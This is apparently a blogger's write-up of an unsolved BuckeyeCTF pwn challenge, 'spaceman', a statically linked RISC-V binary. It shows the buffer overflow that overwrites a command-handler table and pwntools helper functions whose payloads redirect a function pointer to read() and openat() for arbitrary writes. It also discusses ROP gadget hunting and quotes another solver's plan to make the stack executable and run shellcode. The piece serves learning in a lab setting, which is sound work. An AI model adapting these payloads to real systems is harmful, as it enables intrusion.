I worked on this challenge for the entirety of the CTF. I mean I took a break from it for a little to do all of the beginner-pwn challenges so I could have at least contributed, but this was the real challenge I worked on. And to be honest, even though I didn't solve it after over 20 hours of working on it, I definitely learned a lot. 

Lets start by running checksec and file.

```
[*] '/home/papichulo/Desktop/ExploitDev/LiveCTF/BuckeyeCTF/spaceman-chal/spaceman'
    Arch:       riscv64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)
    Stripped:   No
```

```
spaceman: ELF 64-bit LSB executable, UCB RISC-V, RVC, double-float ABI, version 1 (SYSV), statically linked, for GNU/Linux 4.15.0, with debug_info, not stripped
```

First of all, this challenge is very unique with the fact that this runs on the `RISC-V` architecture, which changes things up quite a bit. Also not just that, but the challenge is statically linked and it never calls system, so anything ret2libc/one_gadget related is out of the window (not that one gadget would have even worked because this is a different architecture).

Also before starting, I had to find out how to debug the program since it runs on a different architecture and GDB would crap itself. Anyways what I did is that I had to run the binary in QEMU and send it into a localhost port, and then send a gdb script to that port like so.

```python
import gdb

binary = "spaceman"

gdb.execute(f"file {binary}")
gdb.execute("set architecture riscv:rv64")
gdb.execute("target remote localhost:1234")
```

Anyways, looking at the program, the bug is here.

```c
   6   │ #define CMD_SIZE 0x10
   7   │ 
   8   │ char CMD_BUF[CMD_SIZE] = { 0 };
   9   │ 
  10   │ void handle_echo();
  11   │ void handle_dish();
  12   │ void handle_engines();
  13   │ void handle_shields();
  14   │ void handle_status();
  15   │ void handle_help();
  16   │ 
  17   │ struct {
  18   │     char *cmdName;
  19   │     void (*handler)();
  20   │ } CMD_HANDLERS[] = {
  21   │     "help", handle_help,
  22   │     "echo", handle_echo,
  23   │     "dish", handle_dish,
  24   │     "engines", handle_engines,
  25   │     "shields", handle_shields,
  26   │     "status", handle_status,
  27   │ };
  28   │ 
  29   │ void get_command() {
  30   │     memset(CMD_BUF, 0, CMD_SIZE);
  31   │     printf("COMMAND> ");
  32   │     if (!fgets(CMD_BUF, 0x20, stdin)) {
  33   │         exit(1);
  34   │     }
```

So the program creates a `0x10` sized chunk but then the `fgets()` call tries to put `0x20` bytes into the buffer, overwriting the first struct in `CMD_HANDLERS[]`. This means that overwriting `handle_help` with an address of our choice will let us run whatever function we want, and because the program is statically linked with `fnoPIE`, we will not need any leaks. Also, what I realized was that the registers at the time of calling the `handle` functions will be as goes: `a0` will always equal 0, `a1` is the string of our command in hex form, and `a2` will be the length of the command.

Now with this in mind, my [friend](https://github.com/SolarDebris) found that we can call `read()` on any address and whatever we put in `stdin` next, will be written there. The only problem is that the address is technically 3 bytes long (since there will be null bytes after that) and then because of that, we only overwrite 3 bytes at a time. 

So what I thought of doing was, finding a pointer whose value points to the address of another pointer, whose value points to the address of another pointer, whose value points to the address that we want to modify. And after a little while of looking for that in Ghidra, I finally found it.

```
0x8a488 => 0x8a2b8 => 0x8a518 => writeable memory
```

With this in mind, I created some helper functions. At the time when I tested it I accidentally ended the address in `b` insted of `8` so I thought there was something wrong with my function and I kind of made it a little boofed, but it worked and I was mostly busy on trying to get the flag and not on how well I made my functions. Anyways here they are:

```python
def write_three_bytes(io, p_addr, addr, data): 
    payload = b"A"*0x10 + p64(p_addr)
    payload += p64(e.sym["read"]) # make look up table point to anywhere
    
    sla(io, b"COMMAND>", payload)
    sla(io, b"COMMAND>", p64(addr))

    sl(io, data)
    
def write_data(io, pp_addr, p_addr, addr, data):
    # for some reason the function is being weird
    # so instead of fixing it I am just gonna add something to cope with it
    # spoken like a true programmer
    data = b"AAA\x00\x00" + data

    for i in range(int(len(data) / 3)):
        print(data[i * 3: i * 3 + 3])
        write_three_bytes(io, p_addr, addr, data[i * 3: i * 3 + 4])
        addr += 3

        write_three_bytes(io, pp_addr, p_addr, p32(addr))

```

After that, what we tried to do was write the address of the flag into memory and then call the `open_at()` function because the `param_2` is what is the char pointer.

```python
def open_at(io, p_addr, addr):
    payload = b"A"*0x10 + p64(p_addr)
    payload += p64(e.sym["openat"]) # make look up table point to anywhere
    
    sla(io, b"COMMAND>", payload)
    sla(io, b"COMMAND>", p64(addr))
```

After this we kind of got stuck, then what my friend thought to do was to start a ROP chain so that is what we did. Only problem is that ROP in RISC-V kind of sucks. For some reason, `ropper` won't even try to find gadgets and also, `ROPgadget` will not ever give us a `ret`, so after reading up a bit, I found that `c.jr ra` is the equivalent. So with that in mind, we started trying to construct ROP chains for the next few hours, and even got an [extra hand](https://github.com/Pwnut). 

This is where we got stumped, we tried a lot of things but none of them worked. One good thing that did come out of this though is that I started getting more and more comfortable reading a RISC-V manual throughout the process and started to learn a lot about the architecture. 

In the end, we were in the right path to the intended solution. We just needed more time to keep looking at ROP gadgets and to find what the author called, `the magic gadget`. 

EDIT: turns out ROPgadget did not even show us the gadget we needed. I actually am so pissed off about that now, this sucks.
EDIT 2: I found out how to find it, I had to go through and run `objdump` on the binary and then grepped for the specific gadgets. This is so tragic.

One thing that I did find interesting though, was a specific person's solve. His username on Discord was `lobob-rondo` and he said what he did was and I quote "leak stack, call `__nptl_change_stack_perm` to make stack executable and shellcode". So what I found interesting was that, first ofall, you can leak the stack through `libc_environ`. But most importantly, THERE IS A FUNCTION THAT WILL CHANGE THE STACK TO BE EXECUTABLE!!!! LIKE WHAT????? WHY IS THAT THERE??????? 

Anyways that is a good thing to know for future CTFs. This challenge was very fun and I got quite a bit out of it. Overall great challenge!!!!

